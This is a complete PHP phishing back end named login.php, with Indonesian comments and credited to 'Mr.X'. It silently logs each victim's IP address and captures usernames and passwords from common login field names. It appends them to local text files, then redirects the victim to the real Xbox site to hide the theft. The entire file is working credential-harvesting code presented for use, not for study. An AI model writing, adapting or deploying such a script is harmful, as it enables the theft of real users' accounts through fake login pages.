<?php
// login.php - Secure & Silent Capture Script by Mr.X
error_reporting(0); // Sembunyikan semua warning & notice
header("Content-Type: text/html; charset=UTF-8");

// Ambil IP korban
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

// Simpan IP
file_put_contents("ip.txt", "IP: $ip\n", FILE_APPEND);

// Coba ambil kredensial dari berbagai kemungkinan nama field
$username = $_POST['username'] ?? $_POST['user'] ?? $_POST['email'] ?? $_POST['Email'] ?? $_POST['login'] ?? $_POST['identifier'] ?? "unknown";
$password = $_POST['password'] ?? $_POST['pass'] ?? $_POST['Pass'] ?? $_POST['passwd'] ?? "unknown";

// Simpan kredensial
file_put_contents("usernames.txt", "Username: $username\nPass: $password\nIP: $ip\n", FILE_APPEND);

// Redirect ke halaman asli (misalnya Microsoft/Xbox)
// Anda bisa ubah URL ini sesuai target, tapi untuk universal kita redirect ke index.html
header("Location: https://www.xbox.com/");
exit();
?>